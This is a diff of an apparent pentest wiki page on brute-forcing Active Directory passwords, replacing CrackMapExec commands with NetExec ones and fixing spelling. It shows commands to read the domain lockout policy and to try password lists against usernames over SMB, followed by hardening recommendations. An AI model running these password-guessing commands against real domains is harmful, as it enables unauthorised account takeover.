@@ -22,22 +22,22 @@ permalink: /ad/bruteforce/
 
 ## Vulnerability
 
-Bruteforcing an Active Directory domain consist in trying a large amount of password for one or multiple usernames until finding legit credentials.
+Brute-forcing an Active Directory domain consist in trying a large amount of password for one or multiple usernames until finding legit credentials.
 
 The main issue is that it is possible to enforce password policy on Active Directory, including following options which will be interesting for this exploit.
 
 1. Reset Account Lockout Counter (minutes).
 2. Account Lockout Threshold (number of attempts).
 
-If option `2` is set to `None`, you can perform bruteforce without taking the risk to lock accounts. Otherwise, the account will be locked during the time stated by the option `1`, after have tried to authenticate on the same username the number of attempts stated by the option `2`.
+If option `2` is set to `None`, you can perform brute-force without taking the risk to lock accounts. Otherwise, the account will be locked during the time stated by the option `1`, after have tried to authenticate on the same username the number of attempts stated by the option `2`.
 
 ## Exploit
 
 First, you will need to know the password policy enforced on the domain to prevent any account lockout. If you already have a domain joined account, you can simply kindly ask.
 
 ```bash
-# From Kali.
-cme smb -d $DOMAIN -u $USERNAME -p $PASSWORD --pass-pol
+# With NetExec.
+nxc smb -d $domain -u $username -p $password --pass-pol
 
 # From a domain joined computer with ActiveDirectory PowerShell module.
 Get-ADDefaultDomainPasswordPolicy
@@ -50,14 +50,14 @@ If *Account Lockout Threshold* is set to `None`, prepare your wordlists. Otherwi
 
 ```bash
 # Try multiple passwords with the same username.
-cme smb -d $DOMAIN -u $USERNAME -p passwords.txt
+nxc smb -d $domain -u $username -p passwords.txt
 
 # Try multiple passwords for every username.
-cme smb -d $DOMAIN -u usernames.txt -p passwords.txt
+nxc smb -d $domain -u usernames.txt -p passwords.txt
 ```
 
 ## Recommendations
 
-- [ ] Use strong passwords that are not easily bruteforceable.
+- [ ] Use strong passwords that are not easily brute-forceable.
 - [ ] Enfore strict password policies with account lockout threshold.
 - [ ] Do not reuse passwords from a system to another.
